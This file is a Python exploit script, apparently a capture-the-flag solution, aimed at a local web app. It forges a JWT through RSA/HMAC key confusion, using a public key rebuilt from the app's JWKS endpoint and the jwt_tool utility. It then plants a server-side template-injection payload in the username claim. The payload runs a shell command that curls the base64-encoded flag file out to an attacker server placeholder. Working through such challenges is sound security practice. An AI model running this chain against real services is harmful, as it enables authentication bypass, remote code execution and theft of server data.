import requests
import subprocess
from base64 import urlsafe_b64decode
from Crypto.PublicKey import RSA

# Constants for challenge
BASE_URL = 'http://127.0.0.1'
REGISTER_URL = f'{BASE_URL}/register'
LOGIN_URL = f'{BASE_URL}/login'
JWK_URL = f'{BASE_URL}/jwks.json'
CAT_URL = f'{BASE_URL}/cats'
JWT_TOOL_PATH = f'/home/crystal/apps/jwt_tool'

SSTI_PAYLOAD = "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('curl https://ATTACKER_SERVER/?flag=$(cat /flag* | base64)')}()}"


def base64url_decode(data):
    return urlsafe_b64decode(data + b'=' * (-len(data) % 4))


# Register a new user
def register_user(username, password):
    print(f"[*] Attempting to register user: {username}")
    response = requests.post(
        REGISTER_URL, data={"username": username, "password": password})

    if response.status_code == 200:
        print(f"[*] Registered user: {username}")
    else:
        print(f"[!] Failed to register user: {response.text}")
    return response.status_code == 200


# Login to get JWT
def login_user(username, password):
    session = requests.Session()
    print(f"[*] Attempting to login user: {username}")
    response = session.post(
        LOGIN_URL, data={"username": username, "password": password})

    if response.status_code == 303:
        response = session.get(BASE_URL)

    token = session.cookies.get("token")
    if token:
        print(f"[*] Retrieved JWT: {token}")
    else:
        print(f"[!] Failed to retrieve JWT")
    return token


# Download the JWK (public key)
def download_jwk():
    print(f"[*] Attempting to download JWK...")
    response = requests.get(JWK_URL)

    if response.status_code == 200:
        print("[*] JWK download successful")
        print(f"[*] JWK Response: {response.json()}")
        return response.json()['keys'][0]
    else:
        print(f"[!] Failed to download JWK: {response.text}")
        return None


# Recreate the RSA public key from JWK components (n and e) and save it to a file
def rsa_public_key_from_jwk(jwk):
    print(f"[*] Recreating RSA Public Key from JWK...")

    n = base64url_decode(jwk['n'].encode('utf-8'))
    e = base64url_decode(jwk['e'].encode('utf-8'))

    n_int = int.from_bytes(n, 'big')
    e_int = int.from_bytes(e, 'big')

    rsa_key = RSA.construct((n_int, e_int))
    public_key_pem = rsa_key.export_key('PEM')

    # Save the public key to a file with a newline at the end
    with open("recovered_public.key", "wb") as f:
        f.write(public_key_pem)
        if not public_key_pem.endswith(b'\n'):
            f.write(b"\n")

    print(
        f"[*] Recreated RSA Public Key saved to 'recovered_public.key':\n{public_key_pem.decode()}")
    return


# Tamper JWT with jwt_tool
def modify_jwt_with_tool(token):
    print(f"[*] Modifying JWT with jwt_tool...")

    command = [
        "python", f"{JWT_TOOL_PATH}/jwt_tool.py", token, "-X", "k", "-pk", "./recovered_public.key", "-I", "-pc", "username", "-pv", SSTI_PAYLOAD
    ]

    # Run jwt_tool and capture the output
    result = subprocess.run(command, capture_output=True, text=True)

    # Extract the modified token from jwt_tool output
    for line in result.stdout.splitlines():
        if line.startswith("[+] "):
            modified_token = line.split(" ")[1].strip()
            print(f"[*] Modified JWT: {modified_token}")
            return modified_token

    print(f"[!] Modified JWT not found in jwt_tool output")
    return None


# Test SSTI injection
def test_ssti(modified_token):
    cookies = {'token': modified_token}
    print(f"[*] Sending modified JWT in cookies to test SSTI injection...")
    response = requests.get(CAT_URL, cookies=cookies)

    if response.status_code == 200:
        print("[*] SSTI payload executed successfully!")
        print(f"[*] Server response:\n{response.text}")
    else:
        print(
            f"[!] SSTI execution failed: {response.status_code} - {response.text}")


def main():
    username = "testuser"
    password = "password"

    # Step 1: Register user
    if not register_user(username, password):
        print("[!] Failed to register user.")
        return

    # Step 2: Login and retrieve JWT
    jwt_token = login_user(username, password)
    if not jwt_token:
        print("[!] Failed to retrieve JWT.")
        return

    # Step 3: Download JWK (public key)
    jwk = download_jwk()
    if not jwk:
        print("[!] Failed to download JWK.")
        return

    # Step 4: Recreate public key PEM from JWK
    rsa_public_key_from_jwk(jwk)

    # Step 5: Modify JWT claim (inject payload) using jwt_tool
    modified_jwt = modify_jwt_with_tool(jwt_token)
    if not modified_jwt:
        print("[!] Failed to modify JWT using jwt_tool.")
        return

    # Step 6: Test SSTI injection by sending the modified JWT
    test_ssti(modified_jwt)


if __name__ == "__main__":
    main()
